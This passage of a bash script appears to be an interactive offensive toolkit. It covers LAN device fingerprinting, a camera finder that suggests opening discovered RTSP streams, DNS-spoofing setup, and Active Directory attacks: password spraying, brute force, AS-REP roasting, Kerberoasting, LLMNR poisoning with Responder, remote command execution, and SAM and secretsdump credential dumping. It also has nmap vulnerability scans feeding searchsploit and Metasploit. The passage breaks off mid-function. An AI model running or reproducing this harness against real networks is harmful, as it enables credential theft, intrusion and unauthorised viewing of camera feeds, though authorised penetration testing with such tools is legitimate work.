EE:65|B8:EF:8B|B8:F0:09|B8:F1:2A|B8:F3:17|B8:F4:D0|B8:F5:E7|B8:F6:53|B8:F6:B1|B8:F7:32|B8:F7:4A|B8:F8:28|B8:F8:83|B8:F8:BE|B8:FA:33|B8:FB:B3|B8:FC:9A|B8:FD:32|B8:FE:90|B8:FF:61|B8:FF:B3|BC:0F:64|BC:0F:9A|BC:0F:BA|BC:10:2F|BC:13:A2|BC:14:85|BC:14:EF|BC:15:AC|BC:15:A6|BC:16:65|BC:16:F5|BC:17:B8|BC:18:96|BC:1A:E4|BC:1C:81|BC:1E:85|BC:20:A4|BC:20:BA|BC:22:28|BC:22:47|BC:22:79|BC:25:E0|BC:26:1D|BC:26:C7|BC:28:2C|BC:28:D6|BC:2B:6B|BC:2C:E6|BC:2D:98|BC:2E:48|BC:2E:F6|BC:2F:3D|BC:30:5B|BC:30:7D|BC:30:7E|BC:30:D9|BC:32:5F|BC:32:B2|BC:33:29|BC:33:AC|BC:34:00|BC:34:CA|BC:35:1E|BC:35:E5|BC:38:65|BC:38:98|BC:39:A6|BC:39:D9|BC:3A:EA|BC:3B:AF|BC:3D:85|BC:3E:13|BC:3E:CB|BC:3F:8F|BC:41:00|BC:41:01|BC:41:1D|BC:42:8C|BC:43:77|BC:44:34|BC:44:86|BC:45:5B|BC:45:8C|BC:46:99|BC:47:60|BC:47:8C|BC:48:94|BC:49:B2|BC:4A:56|BC:4B:79|BC:4C:C4|BC:4C:CA|BC:4D:FB|BC:4E:3C|BC:4E:5D|BC:4F:3D|BC:50:9C|BC:51:FE|BC:52:B4|BC:52:B7|BC:54:2F|BC:54:36|BC:54:51|BC:54:F9|BC:54:FC|BC:55:4A|BC:55:76|BC:55:F4|BC:56:2B|BC:56:2C|BC:56:6D|BC:56:9C|BC:56:B7|BC:56:C4|BC:56:F6|BC:57:29|BC:57:5C|BC:57:66|BC:57:E2|BC:58:30|BC:58:6B|BC:58:69|BC:58:99|BC:58:AA|BC:58:B4|BC:58:CC|BC:58:E2|BC:59:9C|BC:59:AB|BC:59:C6|BC:5A:00|BC:5A:34|BC:5A:56|BC:5A:AB|BC:5A:C9|BC:5A:F5|BC:5B:35|BC:5B:A6|BC:5C:17|BC:5C:4C|BC:5C:61|BC:5C:C4|BC:5D:5C|BC:5D:E3|BC:5E:33|BC:5E:5D|BC:5E:65|BC:5E:70|BC:5E:8B|BC:5E:91|BC:5E:A6|BC:5E:B4|BC:5E:C5|BC:5E:D1|BC:5E:F1|BC:5E:FC|BC:5F:24|BC:5F:36|BC:5F:4C|BC:5F:5F|BC:5F:61|BC:5F:6E|BC:5F:78|BC:5F:82|BC:5F:94|BC:5F:9E|BC:5F:A4|BC:5F:B0|BC:5F:B8|BC:5F:BF|BC:5F:C7|BC:5F:CF|BC:5F:D7|BC:5F:E4|BC:5F:F3|BC:5F:F4) echo "Intel network device" ;;
        # Fallback
        *) echo "Unknown device (OUI $mac_upper)" ;;
    esac
}

# Fills in OS + device-type guess from ports + hostname + MAC vendor
lan_classify_device() {
    local ip="$1" mac="$2" hostname="$3"
    local vendor portguess
    vendor=$(lan_fingerprint_mac "$mac")
    local ports=""
    # quick port probe on the most telling ports
    for p in 22 80 443 445 554 5555 3389 62078 7000 9100 5000; do
        timeout 1 nc -z "$ip" "$p" 2>/dev/null && ports="$ports $p"
    done
    local kind="Device"
    if echo "$ports" | grep -q 62078; then
        kind="iPhone / iPad (lockdown 62078)"
    elif echo "$ports" | grep -q 7000; then
        kind="Apple device (AirPlay 7000)"
    elif echo "$ports" | grep -q 5555; then
        kind="Android (ADB 5555)"
    elif echo "$ports" | grep -q 445; then
        kind="Windows PC (SMB 445)"
    elif echo "$ports" | grep -q 3389; then
        kind="Windows PC (RDP 3389)"
    elif echo "$ports" | grep -q 9100; then
        kind="Printer (JetDirect 9100)"
    elif echo "$ports" | grep -q 554; then
        kind="IP camera (RTSP 554)"
    elif echo "$ports" | grep -qE '22|80|443'; then
        kind="Linux / web host"
    fi
    echo "$kind | $vendor | ports:$ports"
}

lan_save_history() {
    # $1=ip $2=mac $3=hostname $4=classify_line
    local ip="$1" mac="$2" host="$3" cls="$4"
    [ -z "$ip" ] && return
    mkdir -p "$(dirname "$LAN_HISTORY")"
    # skip if already present with same IP+MAC
    if [ -f "$LAN_HISTORY" ] && grep -q "^$ip|$mac|" "$LAN_HISTORY"; then
        return
    fi
    printf "%s|%s|%s|%s|%s\n" "$ip" "$mac" "${host:--}" "$cls" "$(date '+%Y-%m-%d %H:%M')" >> "$LAN_HISTORY"
}

lan_show_history() {
    [ ! -f "$LAN_HISTORY" ] && { echo -e "${DIM}No LAN history yet.${NC}"; return; }
    echo ""
    echo -e "${BOLD}${MAGENTA}----- LAN HISTORY -----${NC}"
    printf "  ${BOLD}%-4s %-16s %-18s %-40s %s${NC}\n" "No." "IP" "MAC" "TYPE" "SEEN"
    echo -e "${MAGENTA}  ---------------------------------------------------------------─${NC}"
    local n=1
    while IFS='|' read -r ip mac host cls when; do
        local short_cls="${cls%%|*}"
        printf "  ${BOLD}%-4s${NC} ${YELLOW}%-16s${NC} ${CYAN}%-18s${NC} ${GREEN}%-40s${NC} ${DIM}%s${NC}\n" \
            "$n" "$ip" "$mac" "$short_cls" "$when"
        eval "LAN_HIST_$n=\"$ip\""
        n=$((n+1))
    done < "$LAN_HISTORY"
    echo -e "${MAGENTA}  ---------------------------------------------------------------─${NC}"
}

lan_find_cameras() {
    print_banner
    echo -e "${BOLD}${CYAN}========= FIND HIDDEN CAMERAS =========${NC}"
    echo -e "${DIM}    Looks for devices on your home Wi-Fi that might be cameras.${NC}"
    echo -e "${DIM}    Reads public device info — nothing is broken or modified.${NC}"
    echo ""

    local netinfo
    netinfo=$(lan_get_my_net "")
    [ -z "$netinfo" ] && { echo -e "${RED}[!] Not connected to any Wi-Fi or network.${NC}"; pause; return; }
    local iface="${netinfo%%|*}"
    local cidr="${netinfo##*|}"
    local subnet="${cidr%/*}"
    local prefix="${cidr#*/}"

    echo -e "  ${BOLD}Network:${NC} $subnet/$prefix"
    echo -e "  ${BOLD}Adapter:${NC} $iface"
    echo ""
    echo -e "${CYAN}[*] Scanning for all devices on your home network...${NC}"
    echo -e "${DIM}    This takes 30-60 seconds.${NC}"
    echo ""

    sudo arp-scan --interface="$iface" --localnet 2>/dev/null > /tmp/cam_scan.txt
    local total
    total=$(wc -l < /tmp/cam_scan.txt)

    if [ "$total" -le 2 ]; then
        sudo nmap -sn "$subnet/$prefix" 2>/dev/null | awk '/Nmap scan report/{print $NF}' > /tmp/cam_hosts.txt
    else
        awk '{print $1}' /tmp/cam_scan.txt | grep -E '^[0-9]' > /tmp/cam_hosts.txt
    fi

    local n
    n=$(wc -l < /tmp/cam_hosts.txt)
    echo -e "  ${GREEN}[+] Found $n devices on your network.${NC}"
    echo ""

    echo -e "${BOLD}${CYAN}--- Looking for camera-like devices ---${NC}"
    echo ""

    declare -a CAMS
    local idx=0
    while read -r ip; do
        [ -z "$ip" ] && continue
        local mac
        mac=$(ip neigh show "$ip" 2>/dev/null | awk '{print $5}' | head -1)
        local vendor
        vendor=$(lan_fingerprint_mac "$mac")

        # probe common camera ports quickly
        local is_cam=0
        local ports_hit=""
        for p in 554 8554 80 443 8080 8000 88 8899; do
            timeout 1 nc -z "$ip" "$p" 2>/dev/null && { ports_hit="$ports_hit $p"; }
        done
        # RTSP (554/8554) is the strongest signal for a camera
        echo "$ports_hit" | grep -qE '\b(554|8554)\b' && is_cam=1
        # vendor hints
        echo "$vendor" | grep -iqE 'hikvision|dahua|reolink|amcrest|foscam|axis|wyze|ring|arlo' && is_cam=1
        # many web-ish ports open + non-computer vendor
        echo "$ports_hit" | grep -q 80 && echo "$ports_hit" | grep -q 8080 && echo "$vendor" | grep -iq "unknown" && is_cam=1

        if [ $is_cam -eq 1 ]; then
            idx=$((idx+1))
            CAMS[$idx]="$ip|$mac|$vendor|$ports_hit"
            echo -e "  ${RED}[!] POSSIBLE CAMERA${NC}"
            echo -e "      ${YELLOW}IP:     $ip${NC}"
            echo -e "      ${YELLOW}MAC:    ${mac:-(unknown)}${NC}"
            echo -e "      ${YELLOW}Vendor: $vendor${NC}"
            echo -e "      ${YELLOW}Ports:  $ports_hit${NC}"
            echo ""
        fi
    done < /tmp/cam_hosts.txt

    if [ $idx -eq 0 ]; then
        echo -e "  ${GREEN}[✓] No obvious cameras found.${NC}"
        echo -e "  ${DIM}    Cameras with unique ports or hidden MACs may still exist.${NC}"
    else
        echo -e "${BOLD}${RED}--- $idx possible camera(s) found ---${NC}"
        echo ""
        echo -e "${DIM}    If you don't recognize these devices, check them.${NC}"
        echo -e "${DIM}    To view a stream (if it's open): open VLC and use:${NC}"
        echo -e "    ${CYAN}rtsp://<ip>:554/stream1${NC}"
        echo -e "    ${CYAN}rtsp://<ip>:8554/live${NC}"
        echo ""
        echo -e "${DIM}    If you want more detail on one, use Local Network option 3.${NC}"
    fi
    echo ""
    echo -e "${GREEN}[+] Full list saved to /tmp/cam_hosts.txt${NC}"
    pause
}

# ===============================================================
# STANDALONE DNS SPOOFING (ARP-based MITM)
# ===============================================================

dnsm_ensure_tools() {
    ensure_tool arpspoof dsniff
    ensure_tool iptables
    ensure_tool dnsmasq
}

dnsm_get_gateway() {
    # use the interface we're working on if we know it, else default route
    if [ -n "$DNSM_IFACE" ]; then
        ip route show dev "$DNSM_IFACE" 2>/dev/null | awk '/^default/ {print $3; exit}'
    else
        ip route | awk '/^default/ {print $3; exit}'
    fi
}

ensure_ad_tools() {
    # apt tools
    for t in "nmap:nmap" "rpcclient:samba-common-bin" "ldapsearch:ldap-utils"; do
        local bin="${t%%:*}" pkg="${t##*:}"
        ensure_tool "$bin" "$pkg"
    done

    # impacket (GetNPUsers, GetUserSPNs, secretsdump, ntlmrelayx)
    if ! python3 -c "import impacket" 2>/dev/null; then
        echo -e "${YELLOW}[!] impacket not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Install impacket now (pip)? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            pip3 install --break-system-packages impacket 2>&1 | tail -3
        fi
    fi

    # enum4linux-ng
    if ! command -v enum4linux-ng >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] enum4linux-ng not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Install enum4linux-ng now? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            pip3 install --break-system-packages enum4linux-ng 2>&1 | tail -3
        fi
    fi

    # kerbrute
    if ! command -v kerbrute >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] kerbrute not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Clone kerbrute now? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            [ -d $HOME/kerbrute ] || git clone --depth 1 https://github.com/ropnop/kerbrute $HOME/kerbrute 2>&1 | tail -3
            [ -f $HOME/kerbrute/kerbrute_linux_amd64 ] && sudo ln -sf $HOME/kerbrute/kerbrute_linux_amd64 /usr/local/bin/kerbrute
        fi
    fi

    # netexec / crackmapexec
    if ! command -v nxc >/dev/null 2>&1 && ! command -v crackmapexec >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] netexec / crackmapexec not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Install netexec now (pip)? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            pip3 install --break-system-packages netexec 2>&1 | tail -3
        fi
    fi

    # bloodhound-python
    if ! command -v bloodhound-python >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] bloodhound-python not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Install bloodhound.py now (pip)? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            pip3 install --break-system-packages bloodhound 2>&1 | tail -3
        fi
    fi
}

ad_ask_dc() {
    echo ""
    echo -e "${BOLD}${CYAN}--------- DOMAIN CONTROLLER ---------${NC}"
    echo -e "  ${GREEN}[1]${NC}  Enter manually"
    echo -e "  ${GREEN}[2]${NC}  Discover on local network"
    read -p "$(echo -e ${YELLOW}'Choice [1]: '${NC})" AD_SRC
    AD_SRC="${AD_SRC:-1}"

    if [ "$AD_SRC" = "2" ]; then
        if lan_pick_target "DC"; then
            AD_DC="$LAN_TARGET_IP"
        else
            return 1
        fi
    else
        read -p "$(echo -e ${YELLOW}'DC IP or host: '${NC})" AD_DC
    fi
    [ -z "$AD_DC" ] && return 1
    read -p "$(echo -e ${YELLOW}'Domain (e.g. lab.local): '${NC})" AD_DOMAIN
    [ -z "$AD_DOMAIN" ] && return 1
    read -p "$(echo -e ${YELLOW}'Username [blank for unauthenticated]: '${NC})" AD_USER
    if [ -n "$AD_USER" ]; then
        read -s -p "$(echo -e ${YELLOW}'Password: '${NC})" AD_PASS
        echo ""
    fi
    echo -e "${GREEN}[+] DC: $AD_DC  Domain: $AD_DOMAIN${NC}"
    echo ""
    return 0
}

ad_recon() {
    print_banner
    echo -e "${BOLD}${CYAN}========= AD RECON (no creds needed) =========${NC}"
    ad_ask_dc || { pause; return; }
    ensure_ad_tools
    echo ""
    echo -e "${CYAN}[*] SMB OS discovery...${NC}"
    nmap -Pn -p 445,139,88,389,636,3268,3269 --script smb-os-discovery,smb-enum-shares,smb-enum-users "$AD_DC" | tee "$LOGS_DIR/ad_nmap_${AD_DC}.txt" | head -60
    echo ""
    echo -e "${CYAN}[*] Null session user enum (rpcclient)...${NC}"
    rpcclient -U '' -N "$AD_DC" -c "enumdomusers" 2>&1 | head -30
    echo ""
    echo -e "${CYAN}[*] LDAP root DSE...${NC}"
    ldapsearch -x -H "ldap://$AD_DC" -s base namingContexts 2>&1 | head -10
    pause
}

ad_kerbrute() {
    print_banner
    echo -e "${BOLD}${CYAN}========= KERBRUTE =========${NC}"
    ad_ask_dc || { pause; return; }
    ensure_ad_tools
    echo -e "${CYAN}[*] 1) User enumeration  2) Password spray${NC}"
    read -p "$(echo -e ${YELLOW}'Choice: '${NC})" KC
    case "$KC" in
        1)
            read -p "$(echo -e ${YELLOW}'Userlist [rockyou]: '${NC})" UL
            UL="${UL:-/usr/share/wordlists/rockyou.txt}"
            kerbrute userenum -d "$AD_DOMAIN" --dc "$AD_DC" "$UL" 2>&1 | tee "$LOGS_DIR/ad_kerbrute_${AD_DC}.txt" | tail -40
            ;;
        2)
            read -p "$(echo -e ${YELLOW}'Userlist: '${NC})" UL
            read -p "$(echo -e ${YELLOW}'Password to spray: '${NC})" PW
            kerbrute passwordspray -d "$AD_DOMAIN" --dc "$AD_DC" "$UL" "$PW" 2>&1 | tee "$LOGS_DIR/ad_spray_${AD_DC}.txt" | tail -30
            ;;
    esac
    pause
}

ad_asreproast() {
    print_banner
    echo -e "${BOLD}${CYAN}========= AS-REP ROAST =========${NC}"
    ad_ask_dc || { pause; return; }
    ensure_ad_tools
    echo -e "${DIM}    Accounts with 'Do not require Kerberos preauth' will return a crackable hash.${NC}"
    echo ""
    impacket-GetNPUsers "$AD_DOMAIN/" -dc-ip "$AD_DC" -usersfile /dev/stdin -format hashcat 2>&1 <<< "$(read -p 'Users (comma-sep or blank for enum): ' U; echo "$U" | tr ',' '\n')" | tee "$LOGS_DIR/ad_asrep_${AD_DC}.txt"
    echo ""
    echo -e "${DIM}    Crack with: hashcat -m 18200 hashes.txt wordlist.txt${NC}"
    pause
}

ad_kerberoast() {
    print_banner
    echo -e "${BOLD}${CYAN}========= KERBEROAST =========${NC}"
    ad_ask_dc || { pause; return; }
    [ -z "$AD_USER" ] && { echo -e "${RED}[!] Needs credentials.${NC}"; pause; return; }
    ensure_ad_tools
    echo -e "${CYAN}[*] Requesting SPN service tickets...${NC}"
    impacket-GetUserSPNs "$AD_DOMAIN/$AD_USER:$AD_PASS" -dc-ip "$AD_DC" -request -outputfile "$LOGS_DIR/ad_kerberoast_${AD_DC}.txt"
    echo ""
    echo -e "${DIM}    Crack with: hashcat -m 13100 hashes.txt wordlist.txt${NC}"
    pause
}

ad_cme() {
    print_banner
    echo -e "${BOLD}${CYAN}========= CRACKMAPEXEC / NETEXEC =========${NC}"
    ad_ask_dc || { pause; return; }
    ensure_ad_tools
    local CME=""
    command -v nxc >/dev/null 2>&1 && CME="nxc"
    command -v crackmapexec >/dev/null 2>&1 && CME="crackmapexec"
    [ -z "$CME" ] && { echo -e "${RED}[!] crackmapexec/netexec missing.${NC}"; pause; return; }

    echo -e "  ${GREEN}[1]${NC} SMB host info + signing check"
    echo -e "  ${GREEN}[2]${NC} Credential spray (single password)"
    echo -e "  ${GREEN}[3]${NC} Credential brute (wordlist file)"
    echo -e "  ${GREEN}[4]${NC} List shares with creds"
    echo -e "  ${GREEN}[5]${NC} PSExec (RCE with admin creds)"
    echo -e "  ${GREEN}[6]${NC} Dump SAM hashes (admin creds)"
    echo -e "  ${GREEN}[7]${NC} WinRM command exec (admin creds)"
    read -p "$(echo -e ${YELLOW}'Choice: '${NC})" CC

    case "$CC" in
        1) $CME smb "$AD_DC" 2>&1 | tee "$LOGS_DIR/ad_cme_smb_${AD_DC}.txt" ;;
        2) read -p "Userlist (comma-sep, or single user): " UL
           read -p "Password: " PW
           $CME smb "$AD_DC" -u "$UL" -p "$PW" --continue-on-success 2>&1 | tee "$LOGS_DIR/ad_cme_spray.txt" ;;
        3) read -p "Username (single, e.g. user): " U
           read -p "Wordlist [${HOME}/top10k.txt]: " WL
           WL="${WL:-$HOME/top10k.txt}"
           if [ ! -f "$WL" ]; then
               echo -e "${YELLOW}[!] $WL not found. Generating top 10k from rockyou...${NC}"
               head -10000 /usr/share/wordlists/rockyou.txt > "$WL"
           fi
           echo -e "${CYAN}[*] Brute force SMB against $AD_DC, user=$U${NC}"
           $CME smb "$AD_DC" -u "$U" -p "$WL" --continue-on-success 2>&1 | tee "$LOGS_DIR/ad_cme_brute_${AD_DC}.txt" | grep -E '\[\+\]|STATUS_LOGON_FAILURE' ;;
        4) [ -z "$AD_USER" ] && { read -p "Username: " AD_USER; read -s -p "Password: " AD_PASS; echo ""; }
           $CME smb "$AD_DC" -u "$AD_USER" -p "$AD_PASS" --shares 2>&1 | tee "$LOGS_DIR/ad_cme_shares.txt" ;;
        5) [ -z "$AD_USER" ] && { read -p "Username: " AD_USER; read -s -p "Password: " AD_PASS; echo ""; }
           $CME smb "$AD_DC" -u "$AD_USER" -p "$AD_PASS" -x "whoami /all" 2>&1 | tail -30 ;;
        6) [ -z "$AD_USER" ] && { read -p "Username: " AD_USER; read -s -p "Password: " AD_PASS; echo ""; }
           $CME smb "$AD_DC" -u "$AD_USER" -p "$AD_PASS" --sam 2>&1 | tail -40 ;;
        7) [ -z "$AD_USER" ] && { read -p "Username: " AD_USER; read -s -p "Password: " AD_PASS; echo ""; }
           read -p "Command to run remotely [whoami]: " RCMD
           RCMD="${RCMD:-whoami}"
           $CME winrm "$AD_DC" -u "$AD_USER" -p "$AD_PASS" -x "$RCMD" 2>&1 | tail -20 ;;
    esac
    pause
}

ad_relay() {
    print_banner
    echo -e "${BOLD}${RED}========= NTLM RELAY / LLMNR POISON =========${NC}"
    echo -e "${DIM}    Responder captures NTLMv2 hashes from hosts on the LAN.${NC}"
    echo -e "${DIM}    Combined with ntlmrelayx, you can relay creds to a target where SMB signing is off.${NC}"
    ad_ask_dc || { pause; return; }
    command -v responder >/dev/null 2>&1 || { sudo apt install -y responder 2>&1 | tail -2; }
    python3 -c "import impacket" 2>/dev/null || pip3 install --break-system-packages impacket 2>&1 | tail -2

    local iface
    iface=$(lan_get_my_net "" | cut -d'|' -f1)
    echo -e "${CYAN}[*] Responder on $iface for 90 seconds...${NC}"
    echo -e "${DIM}    Captured hashes in /usr/share/responder/logs/${NC}"
    sudo timeout 90 responder -I "$iface" -rdwv 2>&1 | tail -30
    pause
}

ad_secretsdump() {
    print_banner
    echo -e "${BOLD}${RED}========= SECRETSDUMP (needs admin creds) =========${NC}"
    ad_ask_dc || { pause; return; }
    [ -z "$AD_USER" ] && { echo -e "${RED}[!] Needs admin creds.${NC}"; pause; return; }
    ensure_ad_tools
    impacket-secretsdump "$AD_DOMAIN/$AD_USER:$AD_PASS@$AD_DC" 2>&1 | tee "$LOGS_DIR/ad_secrets_${AD_DC}.txt" | tail -60
    pause
}

ad_bloodhound() {
    print_banner
    echo -e "${BOLD}${CYAN}========= BLOODHOUND COLLECTION =========${NC}"
    ad_ask_dc || { pause; return; }
    [ -z "$AD_USER" ] && { echo -e "${RED}[!] Needs creds.${NC}"; pause; return; }
    ensure_ad_tools
    bloodhound-python -c All -u "$AD_USER" -p "$AD_PASS" -d "$AD_DOMAIN" -dc "$AD_DC" -ns "$AD_DC" \
        --zip -op "$LOGS_DIR/bh_${AD_DOMAIN}" 2>&1 | tail -30
    echo ""
    echo -e "${GREEN}[+] BloodHound zip in $LOGS_DIR${NC}"
    pause
}

ensure_internal_tools() {
    ensure_tool nmap
    ensure_tool searchsploit exploitdb
    ensure_tool msfconsole metasploit-framework
    ensure_tool redis-cli redis-tools
    ensure_tool psql postgresql-client
    ensure_tool mysql mysql-client
    ensure_tool ldapsearch ldap-utils
    ensure_tool smbclient smbclient
    ensure_tool snmpwalk snmp
    ensure_tool mongosh mongodb-mongosh
}

# ===============================================================
# lan_pick_target — 30s discovery, then menu of live hosts
# returns 0 and sets LAN_TARGET / LAN_TARGET_IP on success
# returns 1 if user cancels
# ===============================================================

lan_pick_target() {
    local label="${1:-TARGET}"

    # force IPv4-only for every command in this function
    export LC_ALL=C

    local netinfo
    netinfo=$(lan_get_my_net "")
    if [ -z "$netinfo" ]; then
        echo -e "${RED}[!] No active network interface.${NC}"
        return 1
    fi
    local iface="${netinfo%%|*}"
    local cidr="${netinfo##*|}"
    local net="${cidr%/*}"
    local prefix="${cidr#*/}"

    echo ""
    echo -e "${BOLD}${CYAN}--------- DISCOVER ${label} ---------${NC}"
    echo -e "${DIM}    Interface: $iface   Subnet: $net/$prefix${NC}"
    echo -e "${DIM}    (change interface from Local Network menu → option 9)${NC}"
    echo ""
    echo -e "${CYAN}[*] Scanning for live hosts (~30s max)...${NC}"

    local hosts_file="/tmp/lan_discover_$$.txt"
    : > "$hosts_file"

    # arp-scan — IPv4 only
    sudo timeout 20 arp-scan --interface="$iface" --localnet --retry=1 --timeout=200 2>/dev/null \
        | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[ \t]+/ {print $1"|"$2}' >> "$hosts_file"

    # nmap fallback — IPv4 only, no -Pn
    if [ ! -s "$hosts_file" ]; then
        sudo timeout 25 nmap -sn -4 -T4 --max-rtt-timeout 100ms --max-retries 1 \
            "$net/$prefix" 2>/dev/null \
            | awk '/Nmap scan report for/ {print $NF"|"}' >> "$hosts_file"
    fi

    # ARP cache — IPv4 only, grab only lines where the neighbor entry has a MAC
    ip -4 neigh show dev "$iface" 2>/dev/null \
        | awk '$1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $3 ~ /^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$/ {print $1"|"$3}' >> "$hosts_file"

    # gateway, IPv4 only
    ip -4 route show dev "$iface" 2>/dev/null \
        | awk '/^default/{print $3"|"}' >> "$hosts_file"

    # dedupe by IP, keep the MAC we saw first (or blank)
    awk -F'|' '!seen[$1]++ {print $1"|"$2}' "$hosts_file" > "${hosts_file}.dedup"

    # sort numerically by IP
    awk -F'|' '{
        split($1, o, ".");
        printf "%03d.%03d.%03d.%03d|%s|%s\n", o[1],o[2],o[3],o[4],$1,$2
    }' "${hosts_file}.dedup" | sort | awk -F'|' '{print $2"|"$3}' > "${hosts_file}.sorted"

    local n
    n=$(wc -l < "${hosts_file}.sorted")
    echo -e "${GREEN}[+] Found $n live host(s).${NC}"
    echo ""

    if [ "$n" -eq 0 ]; then
        echo -e "${YELLOW}[!] No hosts answered on $net/$prefix via $iface.${NC}"
        read -p "$(echo -e ${YELLOW}'Enter an IP manually (blank to cancel): '${NC})" MANUAL
        [ -z "$MANUAL" ] && { rm -f "$hosts_file"*; return 1; }
        LAN_TARGET_IP="$MANUAL"
        LAN_TARGET="$MANUAL"
        rm -f "$hosts_file"*
        return 0
    fi

    printf "  ${BOLD}%-4s %-16s %-18s %s${NC}\n" "No." "IP" "MAC" "HOSTNAME"
    echo -e "${CYAN}  ------------------------------------------------${NC}"

    local i=1
    declare -a ips
    while IFS='|' read -r ip mac; do
        [ -z "$ip" ] && continue
        # skip IPv6 (safety)
        [[ "$ip" == *:* ]] && continue
        # skip 0.0.0.0
        [ "$ip" = "0.0.0.0" ] && continue
        [ -z "$mac" ] && mac="-"
        local host
        host=$(getent hosts "$ip" 2>/dev/null | awk '{print $2}' | head -1)
        [ -z "$host" ] && host="-"
        printf "  ${BOLD}%-4s${NC} ${YELLOW}%-16s${NC} ${CYAN}%-18s${NC} ${GREEN}%s${NC}\n" "$i" "$ip" "$mac" "$host"
        ips[$i]="$ip"
        i=$((i+1))
    done < "${hosts_file}.sorted"

    echo -e "${CYAN}  ------------------------------------------------${NC}"
    echo ""
    echo -e "  ${DIM}    0 = enter IP manually${NC}"
    echo -e "  ${DIM}    Enter with no input = cancel${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}'Pick number: '${NC})" P

    if [ -z "$P" ]; then
        rm -f "$hosts_file"*
        return 1
    fi
    if [ "$P" = "0" ]; then
        read -p "$(echo -e ${YELLOW}'Target IP: '${NC})" MANUAL
        [ -z "$MANUAL" ] && { rm -f "$hosts_file"*; return 1; }
        LAN_TARGET_IP="$MANUAL"
        LAN_TARGET="$MANUAL"
        rm -f "$hosts_file"*
        return 0
    fi
    if ! [[ "$P" =~ ^[0-9]+$ ]] || [ "$P" -lt 1 ] || [ "$P" -gt "$n" ]; then
        echo -e "${YELLOW}[!] Invalid selection.${NC}"
        rm -f "$hosts_file"*
        return 1
    fi

    LAN_TARGET_IP="${ips[$P]}"
    LAN_TARGET="$LAN_TARGET_IP"
    echo -e "${GREEN}[+] Selected: $LAN_TARGET_IP${NC}"
    rm -f "$hosts_file"*
    sleep 1
    return 0
}

internal_ask_target() {
    if lan_pick_target "TARGET"; then
        INT_TARGET="$LAN_TARGET_IP"
        return 0
    fi
    # fall back to manual entry
    echo ""
    read -p "$(echo -e ${YELLOW}'Target IP (manual): '${NC})" INT_TARGET
    [ -z "$INT_TARGET" ] && return 1
    return 0
}

internal_nmap_full() {
    print_banner
    echo -e "${BOLD}${CYAN}========= FULL SERVICE + VERSION + VULN =========${NC}"
    internal_ask_target || { pause; return; }
    ensure_internal_tools

    local xml="/tmp/int_nmap_$$.xml"
    echo -e "${CYAN}[*] Running nmap -p- -sV --script vuln (may take 5-15 min)...${NC}"
    sudo nmap -Pn -T4 -p- -sV --script vuln "$INT_TARGET" -oX "$xml" -oN "$LOGS_DIR/int_nmap_${INT_TARGET}.txt"
    echo ""
    echo -e "${GREEN}[+] Raw scan saved: $LOGS_DIR/int_nmap_${INT_TARGET}.txt${NC}"
    echo ""

    # --- AUTO SEARCHSPLOIT ---
    echo -e "${BOLD}${CYAN}========= AUTO SEARCHSPLOIT =========${NC}"
    echo -e "${DIM}    Matching found services against public exploits...${NC}"
    echo ""

    local services
    services=$(sudo nmap -Pn -T4 -sV "$INT_TARGET" 2>/dev/null | grep -E '^[0-9]+/tcp.*open')
    if [ -z "$services" ]; then
        echo -e "${YELLOW}[!] No open services parsed — skipping searchsploit.${NC}"
        pause
        return
    fi

    local out="$LOGS_DIR/int_sploits_${INT_TARGET}.txt"
    : > "$out"
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        local svc
        svc=$(echo "$line" | awk '{for(i=4;i<=NF;i++) printf "%s ", $i; print ""}' | sed 's/  */ /g')
        [ -z "$svc" ] && continue
        echo -e "${YELLOW}--- port $line ---${NC}"
        echo "--- $line ---" >> "$out"
        searchsploit "$svc" 2>/dev/null | head -10 | tee -a "$out"
        echo "" | tee -a "$out"
    done <<< "$services"

    echo ""
    echo -e "${GREEN}[+] SearchSploit results saved: $out${NC}"
    echo -e "${DIM}    To view an exploit: searchsploit -x <path>${NC}"
    pause
}

internal_searchsploit() {
    print_banner
    echo -e "${BOLD}${CYAN}========= SEARCHSPLOIT INTEGRATION =========${NC}"
    internal_ask_target || { pause; return; }
    echo -e "${CYAN}[*] Grabbing service versions first...${NC}"
    local services
    services=$(sudo nmap -Pn -T4 -sV "$INT_TARGET" 2>/dev/null | grep -E '^[0-9]+/')
    echo "$services"
    echo ""
    echo -e "${CYAN}[*] Looking up matching exploits...${NC}"
    echo "$services" | awk '{for(i=3;i<=NF;i++) printf "%s ", $i; print ""}' | while read -r line; do
        [ -z "$line" ] && continue
        echo -e "${YELLOW}--- $line ---${NC}"
        searchsploit "$line" 2>/dev/null | head -6
        echo ""
    done | tee "$LOGS_DIR/int_sploits_${INT_TARGET}.txt"
    pause
}

internal_msf_autorun() {
    print_banner
    echo -e "${BOLD}${CYAN}========= METASPLOIT AUTO-RUN =========${NC}"
    internal_ask_target || { pause; return; }
    echo -e "${CYAN}[*] Importing nmap results into MSF db...${NC}"
    sudo msfdb init 2>&1 | tail -3
    nmap -Pn -T4 -sV -oX /tmp/msf_scan.xml "$INT_TARGET" >/dev/null 2>&1
    msfconsole -q -x "db_import /tmp/msf_scan.xml; hosts; services; exit" 2>&1 | tail -40
    echo ""
    echo -e "${DIM}    Open msfconsole and type: db_autopwn or use search <service>${NC}"
    pause
}

internal_db_connect() {
    print_banner
    echo -e "${BOLD}${CYAN}========= DATABASE CONNECT =========${NC}"
    internal_ask_target || { pause; return; }

    echo -e "  ${GREEN}[1]${NC} MySQL (3306)"
